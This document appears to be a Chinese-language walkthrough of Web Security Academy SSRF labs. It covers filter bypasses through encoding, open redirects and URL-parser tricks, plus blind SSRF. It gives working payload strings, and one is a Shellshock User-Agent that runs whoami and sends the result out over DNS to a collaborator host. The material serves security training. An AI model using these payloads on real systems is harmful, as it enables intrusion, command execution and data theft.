## 目录

- [针对本地服务器的基本 SSRF](#针对本地服务器的基本SSRF)
- [针对另一个后端系统的基本SSRF](#针对另一个后端系统的基本SSRF)
- [带外检测的盲SSRF](#带外检测的盲SSRF)
- [使用基于黑名单的输入过滤器的SSRF](#使用基于黑名单的输入过滤器的SSRF)
- [通过开放重定向漏洞绕过过滤器的SSRF](#通过开放重定向漏洞绕过过滤器的SSRF)
- [使用Shellshock漏洞的盲SSRF](#使用Shellshock漏洞的盲SSRF)
- [使用基于白名单的输入过滤器的SSRF](#使用基于白名单的输入过滤器的SSRF)
- [参考](#参考)



## 针对本地服务器的基本SSRF

选择一个商品，进去点检查库存 

![image-20240910141151318](./imgs/image-20240910141151318.png)

![image-20240910141337458](./imgs/image-20240910141337458.png)

![image-20240910141428677](./imgs/image-20240910141428677.png)

## 针对另一个后端系统的基本SSRF

访问产品，点击“检查库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。

该lab关注的情景是部署网站的局域网内的其他机器 通过该lab的条件是探测局域网`192.168.0.0/24`网段中的服务，删除carlos账户 进入lab，按上述提到的流程操作，发现和lab1类似的漏洞点 构造`http://192.168.0.1:8080/admin`发送请求，报错参数不存在

![image-20240910141831697](./imgs/image-20240910141831697.png)



![image-20240910142032997](./imgs/image-20240910142032997.png)

![image-20240910142043305](./imgs/image-20240910142043305.png)

![image-20240910142018447](./imgs/image-20240910142018447.png)

，将请求发送给intruder模块探测网段，发现`192.168.0.138`返回包的状态码是200

![image-20240910142130572](./imgs/image-20240910142130572.png)

![image-20240910142144932](./imgs/image-20240910142144932.png)

成功删除carlos

![image-20240910142222944](./imgs/image-20240910142222944.png)

## 带外检测的盲SSRF

先去collaborator生成一个随机的子域名

![image-20240910142535763](./imgs/image-20240910142535763.png)

商品详情的的请求发送到repeater，修改referrer字段

![image-20240910142519121](./imgs/image-20240910142519121.png)

collaborator页面观察是否有请求

![image-20240910142626981](./imgs/image-20240910142626981.png)

## 使用基于黑名单的输入过滤器的SSRF

访问产品，点击 “检查库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。

该lab关注的情景是web应用基于黑名单机制对输入进行过滤，需要绕过过滤实施攻击 通过lab的条件是访问`http://localhost/admin`，删除carlos的账户 基于前两个lab的经验，我直接构造了以下请求，发现被阻止了 `http%3a%2f%2f127.0.01%2fadmin%2fdelete%3fusername%3dcarlos`



![image-20240910143340034](./imgs/image-20240910143340034.png)

payload，将`127.0.0.1`修改为`127.1`，再次尝试，还是不成功

改payload，对url的path部分（即admin）进行一次url编码，还是不成功 `http%3a%2f%2f127.1%2f%61dmin%2fdelete%3fusername%3dcarlos`

通过将“a”编码为 %2561 的双重 URL 来混淆“a”，以访问管理界面并删除目标用户。

`http%3a%2f%2f127.1%2f%2561dmin%252fdelete%253fusername%253dcarlos`

![image-20240910144056578](./imgs/image-20240910144056578.png)

## 通过开放重定向漏洞绕过过滤器的SSRF

![image-20240910144410655](./imgs/image-20240910144410655.png)

该lab关注的情景是web应用对url的host部分的校验非常完善，无法直接发起恶意的服务端请求，但是该域名下其他功能存在开放重定向漏洞，这时候可以通过设置开放重定向的url来实施SSRF 通过该lab的条件是访问`http://192.168.0.12:8080/admin`，删除carlos账户 进入lab后尝试所有的功能，发现lab1，lab2和lab4的攻击方式都不成功，发现该lab有一新功能请求如下 `GET /product/nextProduct?currentProductId=2&path=` path是一个实施重定向的参数，并且存在开放重定向漏洞

![image-20240910145546322](./imgs/image-20240910145546322.png)

再次构造payload，构造stockApi参数如下

![image-20240910145534598](./imgs/image-20240910145534598.png)

## 使用Shellshock漏洞的盲SSRF

该lab关注的情景是Blind SSRF 通过条件是探测网段`192.168.0.0/24`的8080端口，使用[Shellshock漏洞](https://fdlucifer.github.io/2020/04/02/shellshock-exploitation/)获取到运行服务的OS的当前用户名 为了更好的探测网站是否存在SSRF漏洞，使用Collaborator EveryWhere插件

![image-20240910145938872](./imgs/image-20240910145938872.png)

域名添加到target->scope中

![image-20240910150900852](./imgs/image-20240910150900852.png)

浏览网站

请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。

![image-20240910151023037](./imgs/image-20240910151023037.png)

观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。

![image-20240910151108612](./imgs/image-20240910151108612.png)

将请求发送到产品页面给 intruder中

设置User-Agent为：`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` 设置Referrer为：`http://192.168.0.1:8080` 开始攻击

![image-20240910151822670](./imgs/image-20240910151822670.png)

collaborator客户端，收到两个dns请求，请求的域名包含了需要的用户名

![image-20240910151853635](./imgs/image-20240910151853635.png)



## 使用基于白名单的输入过滤器的SSRF

![image-20240910152638986](./imgs/image-20240910152638986.png)

`stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`

![image-20240910152839601](./imgs/image-20240910152839601.png)





## 参考

- https://www.ddosi.org/ssrf-lab/